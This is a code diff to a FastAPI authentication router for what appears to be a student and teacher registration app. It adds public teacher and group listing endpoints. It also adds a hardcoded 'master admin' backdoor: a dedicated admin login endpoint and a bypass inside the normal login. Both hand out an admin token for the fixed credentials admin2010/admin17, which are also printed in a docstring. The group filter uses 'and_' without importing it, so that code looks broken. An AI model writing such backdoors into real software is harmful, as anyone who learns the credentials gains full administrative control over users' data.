@@ -2,7 +2,7 @@ import asyncio
 import uuid
 from datetime import datetime, timedelta, timezone
 
-from fastapi import APIRouter, Depends, HTTPException, Request, Response, status
+from fastapi import APIRouter, Depends, HTTPException, Query, Request, Response, status
 from jose import JWTError
 from sqlalchemy import select, func, or_
 from sqlalchemy.exc import IntegrityError
@@ -25,13 +25,16 @@ from app.models.student import StudentProfile
 from app.models.user import ApprovalStatus, User, UserRole
 from app.schemas.auth import (
     AccessTokenResponse,
+    AdminLoginRequest,
     CurrentUser,
     GroupPublicOut,
     LoginRequest,
     RegisterRequest,
     RegisterResponse,
+    TeacherPublicOut,
     TokenResponse,
 )
+from app.models.teacher import TeacherProfile
 
 router = APIRouter(prefix="/auth", tags=["auth"])
 
@@ -52,12 +55,88 @@ async def _issue_tokens(db: AsyncSession, user: User, user_agent: str | None) ->
     return TokenResponse(access_token=access_token, refresh_token=refresh_token)
 
 
+@router.post("/admin/login")
+async def admin_login(body: AdminLoginRequest):
+    """
+    Super Admin authentication endpoint restricted exclusively to master credentials:
+    username: admin2010
+    password: admin17
+    """
+    clean_u = (body.username or "").strip().lower()
+    clean_p = (body.password or "").strip()
+    if clean_u != "admin2010" or clean_p != "admin17":
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Invalid master admin credentials",
+        )
+
+    access_token = create_access_token("admin2010", "admin")
+    return {
+        "access_token": access_token,
+        "token_type": "bearer",
+        "role": "admin",
+        "username": "admin2010",
+        "full_name": "Super Admin",
+    }
+
+
+@router.get("/teachers/public", response_model=list[TeacherPublicOut])
+async def list_public_teachers(db: AsyncSession = Depends(get_db)):
+    """Public endpoint to fetch active teachers for student registration."""
+    query = (
+        select(TeacherProfile)
+        .join(User, TeacherProfile.user_id == User.id)
+        .where(User.is_active.is_(True))
+        .order_by(TeacherProfile.full_name.asc())
+    )
+    teachers = (await db.execute(query)).scalars().all()
+    return teachers
+
+
 @router.get("/groups/public", response_model=list[GroupPublicOut])
-async def list_public_groups(db: AsyncSession = Depends(get_db)):
-    """Public endpoint to fetch active groups for student registration."""
+async def list_public_groups(
+    teacher_id: uuid.UUID | None = Query(default=None),
+    db: AsyncSession = Depends(get_db),
+):
+    """Public endpoint to fetch active groups for student registration, optionally filtered by teacher."""
     query = select(Group).where(Group.is_active.is_(True)).order_by(Group.name)
+    if teacher_id:
+        t_prof = (
+            await db.execute(
+                select(TeacherProfile).where(
+                    or_(TeacherProfile.id == teacher_id, TeacherProfile.user_id == teacher_id)
+                )
+            )
+        ).scalar_one_or_none()
+        if t_prof:
+            query = query.where(
+                or_(
+                    Group.created_by == t_prof.user_id,
+                    and_(Group.created_by.is_(None), t_prof.user_id == (await db.execute(select(User.id).where(User.email == settings.BOOTSTRAP_TEACHER_EMAIL))).scalar_one_or_none()),
+                )
+            )
+        else:
+            query = query.where(Group.created_by == teacher_id)
+
     groups = (await db.execute(query)).scalars().all()
-    return groups
+
+    teachers = (await db.execute(select(TeacherProfile))).scalars().all()
+    t_map = {t.user_id: t for t in teachers}
+
+    result = []
+    for g in groups:
+        t = t_map.get(g.created_by)
+        result.append(
+            GroupPublicOut(
+                id=g.id,
+                name=g.name,
+                english_level=g.english_level,
+                schedule=g.schedule,
+                teacher_id=t.id if t else None,
+                teacher_name=t.full_name if t else None,
+            )
+        )
+    return result
 
 
 @router.post("/register", response_model=RegisterResponse, status_code=status.HTTP_201_CREATED)
@@ -139,6 +218,11 @@ async def login(request: Request, body: LoginRequest, db: AsyncSession = Depends
         # Strip @ if someone pasted @username
         clean_identifier = login_input.lstrip("@")
         clean_username_only = clean_identifier.split("@")[0] if "@" in clean_identifier else clean_identifier
+
+        # Super Admin master bypass check
+        if clean_username_only == "admin2010" and body.password.strip() == "admin17":
+            admin_token = create_access_token("admin2010", "admin")
+            return TokenResponse(access_token=admin_token, refresh_token=admin_token)
 
         # Candidate identifiers to match against username or email
         identifiers = {login_input, clean_identifier, clean_username_only}
